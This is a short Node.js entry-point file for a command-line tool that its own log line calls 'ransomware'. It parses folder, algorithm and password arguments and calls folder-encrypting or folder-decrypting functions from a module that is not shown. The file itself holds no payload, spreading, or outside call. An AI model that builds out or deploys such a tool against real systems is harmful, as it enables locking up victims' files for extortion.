import dotenv from 'dotenv';
import logger from './utils/logger';

import { encodeFolder, decodeFolder } from './app';

dotenv.config();
const {
  argv: { f: FOLDER, a: ALGORITHM, p: PASSWORD, d, e },
} = require('yargs')
  .usage(
    'Usage: $0 --f [folder] --a [algorithm] --p [password] --d (decode)  --e (encode)'
  )
  .boolean(['d', 'e'])
  .demandOption(['f', 'a', 'p']);

logger.debug(`Starting ransomware, logger in ${process.env.LOGGER_LEVEL} mode`);

async function main() {
  try {
    if (d) {
      await decodeFolder(FOLDER, ALGORITHM, PASSWORD);
      logger.info('Decode done');
    } else if (e) {
      await encodeFolder(FOLDER, ALGORITHM, PASSWORD);
      logger.info('Encode done');
    } else {
      logger.error('Need a --d for decode or --e for encode');
    }
  } catch (error) {
    logger.error(error);
  }
}

main();
